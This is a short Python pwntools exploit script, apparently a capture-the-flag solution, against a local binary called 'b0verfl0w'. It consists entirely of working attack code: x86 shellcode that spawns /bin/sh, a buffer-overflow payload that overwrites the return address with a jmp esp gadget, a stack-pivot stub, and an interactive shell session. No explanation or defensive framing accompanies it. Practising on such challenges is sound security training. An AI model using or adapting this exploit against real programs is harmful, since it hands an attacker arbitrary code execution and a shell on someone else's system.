from pwn import *

sh = process("./b0verfl0w")

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"
jmp_code = asm("sub esp, 0x28;jmp esp")

payload = flat([shellcode, (32-len(shellcode))*"A", "BBBB", p32(0x08048504), jmp_code]) #32 = 0x20

sh.send(payload)
sh.interactive()
